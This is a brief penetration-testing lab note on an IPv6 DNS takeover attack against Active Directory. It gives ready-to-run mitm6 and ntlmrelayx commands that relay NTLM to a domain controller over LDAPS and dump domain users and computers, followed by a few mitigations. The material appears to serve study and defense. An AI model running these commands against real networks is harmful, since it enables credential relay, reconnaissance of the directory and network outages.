# IPv6 attacks
- This is another form of relaying but more reliable
- tool used is MitM6
- only run this in small sprints. It will cause outages in a network (no longer than 5 to 10 mins)

1. Run the command first ```ntlmrelayx.py -6 -t ldaps://(domain controller IP) -wh fakewpad.marvel.local -l lootme```
- -6 is for IP v6
- -t is for target
- -wh for fake wpad
2. ```sudo mitm6 -d marvel.local```
3. Reboot machine

Look for the following
- Domain_users_by_group.html
- Domain_computers.html

<img width="1386" height="355" alt="image" src="https://github.com/user-attachments/assets/c86c0068-1d2a-402b-8a30-98d3c742c480" />
<img width="1473" height="530" alt="image" src="https://github.com/user-attachments/assets/eb7f44d9-6359-4c54-b1e0-0e2403fa7be5" />


## Mitigations
- Disabled WPAD if not in use internally
- Disabled IPv6 (this may cause issues within the environment)
- Move Administrative users to the protected users group or marking them as Account is sensitive and cannot be delegated.
